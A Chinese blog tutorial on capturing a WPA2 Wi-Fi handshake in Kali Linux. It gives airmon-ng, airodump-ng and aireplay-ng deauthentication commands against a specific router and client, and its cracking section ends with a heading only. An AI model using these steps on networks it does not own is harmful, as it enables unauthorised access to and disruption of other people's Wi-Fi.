---
title: KaliLinux捕获wifi握手包，EWAS爆破wifi密码
tags: [安全记录]
---

## 前言

这种方式仅是了解相关知识，没有太大的实操意义

## 准备

* Kali Linux (直接下载虚拟机版) [Get Kali | Kali Linux](https://www.kali.org/get-kali/#kali-virtual-machines)
* VMWare
* 支持嗅探的无线网卡

## 原理

在目标wifi进行连接时，会与建立连接的手机之间发送握手包，其原理就是通过握手包里的偏移量反穷举出wifi密码 （要不咋说是爆破呢）具体协议可通过wireshark捕获后查看（还没搞懂整个wpa2-psk相关的具体协议）

## Kali Linux重置密码

2023新版的kali 默认账户密码是 **kali/kali**

先以 kali/kali 普通用户的身份登录

然后切换 root 用户

```shell
sudo su
```

root密码也是 **kali**

然后更换root账户密码

```bash
psswd root
```

## 设置中文

在root账户下执行以下命令

```shell
dpkg-reconfigure locales
```
找到**en_US.UTF-8 UTF-8**选项，按空格键将其进行取消

![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241323962.png)

选择语言**zh_CN.UTF-8 UTP-8**，空格选择，按tab键选择ok

在此处选择zh_CN.UTF-8字符编码，在<0k> 处按空格键进行确认

![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241325766.png)

然后重启

## 握手包捕获

先将网卡连接到虚拟机

先查看当前的网卡设备，后面带有 usb的就是嗅探的网卡

```bash
airmon-ng  #查看当前的网卡设备
```



![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241332137.png)

将网卡切换至监听模式

```bash
airmon-ng start wlan0 ## start后面跟设备的接口名
```

再用airmon-ng命令查看，当设备名后面多了个**mon**的后缀就表示已经切换至监听状态了

![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241334541.png)

查看当前所有的热点信息

```bash
airodump-ng wlan0mon  ## 后面跟监听网卡的接口名
```

![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241340725.png)

开始捕获握手包

以下 -c 指定信道 对应CH  -w 指定写入文件，最后跟要使用的网卡设备

```shell
airodump-ng -c 1 --bssid B0:45:02:D2:B7:14 -w shaoyu wlan0mon
```

在捕获的同时使用断网攻击

-0 指定攻击等级，-a 指定热点源，一般是是路由器wifi，-c 指定客户端，一般是手机

```bash
aireplay-ng -0 10 -a B0:45:02:D2:B7:14 -c 7C:D6:61:85:FD:BF wlan0mon
```

## ESWA万能破解

